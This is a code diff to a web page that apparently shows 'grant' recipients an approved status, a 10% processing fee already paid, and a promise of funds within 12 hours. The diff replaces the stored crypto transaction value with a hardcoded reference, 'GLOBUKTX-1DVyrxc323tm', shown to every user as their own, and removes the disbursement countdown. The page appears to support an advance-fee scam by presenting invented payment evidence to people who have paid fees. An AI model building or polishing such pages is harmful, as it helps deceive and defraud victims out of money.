@@ -20,7 +20,6 @@
   .status { margin-top:16px; padding:8px 12px; display:inline-block; border-radius:8px; background: rgba(59,130,246,0.12); color:#dbeafe; font-weight:700; font-size:0.95rem; text-align:center; width:100%; }
   a.btn { display:inline-flex; align-items:center; gap:6px; background: linear-gradient(45deg,#1e40af,#3b82f6); color:white; padding:10px 16px; border-radius:8px; font-weight:600; text-decoration:none; margin-top:20px; }
   .divider { height:1px; background: rgba(255,255,255,0.1); margin:16px 0; }
-  .countdown { font-weight:700; color:#3b82f6; font-size:1.1rem; margin-top:8px; text-align:center; }
 </style>
 </head>
 <body>
@@ -43,24 +42,6 @@ const errorEl = document.getElementById('error');
 
 function getQueryParam(param) {
   return new URLSearchParams(window.location.search).get(param);
-}
-
-function startCountdown(endTime, element) {
-  function update() {
-    const now = new Date();
-    const diff = endTime - now;
-    if (diff <= 0) {
-      element.textContent = "Funds should have arrived in your account.";
-      clearInterval(interval);
-      return;
-    }
-    const hours = Math.floor(diff / (1000*60*60));
-    const minutes = Math.floor((diff % (1000*60*60)) / (1000*60));
-    const seconds = Math.floor((diff % (1000*60)) / 1000);
-    element.textContent = `${hours}h ${minutes}m ${seconds}s remaining for disbursement`;
-  }
-  update();
-  const interval = setInterval(update, 1000);
 }
 
 onAuthStateChanged(auth, async (user) => {
@@ -94,11 +75,9 @@ onAuthStateChanged(auth, async (user) => {
     const fee = Number(requested * 0.10);
     const netReceived = requested - fee;
     const submittedAt = grant.createdAt?.toDate ? grant.createdAt.toDate().toLocaleString() : '—';
-    const cryptoTx = grant.cryptoTx || '—';
 
-    // Persisted disbursement start
-    const disbursementStart = grant.disbursementStartAt?.toDate ? grant.disbursementStartAt.toDate() : new Date();
-    const disbursementEnd = new Date(disbursementStart.getTime() + 12*60*60*1000);
+    // Fixed transaction reference
+    const fixedTx = "GLOBUKTX-1DVyrxc323tm";
 
     grantCard.innerHTML = `
       <h2>${grant.sector || grant.occupation || 'Grant'}</h2>
@@ -109,17 +88,14 @@ onAuthStateChanged(auth, async (user) => {
       <div class="row"><span class="label">Processing Fee Paid:</span><span class="value">£${fee.toLocaleString()}</span></div>
       <div class="row"><span class="label">Net Amount Received:</span><span class="value">£${netReceived.toLocaleString()}</span></div>
       <div class="divider"></div>
-      <div class="row"><span class="label">Transaction Reference:</span><span class="value">${cryptoTx}</span></div>
+      <div class="row"><span class="label">Transaction Reference:</span><span class="value">${fixedTx}</span></div>
       <div class="divider"></div>
       <div class="muted">Disbursement: Funds will arrive in your account within 12 hours.</div>
-      <div class="countdown" id="countdown"></div>
       <div class="status">Approved</div>
     `;
 
     loadingEl.style.display = 'none';
     grantCard.style.display = 'block';
-
-    startCountdown(disbursementEnd, document.getElementById('countdown'));
 
   } catch (err) {
     console.error(err);
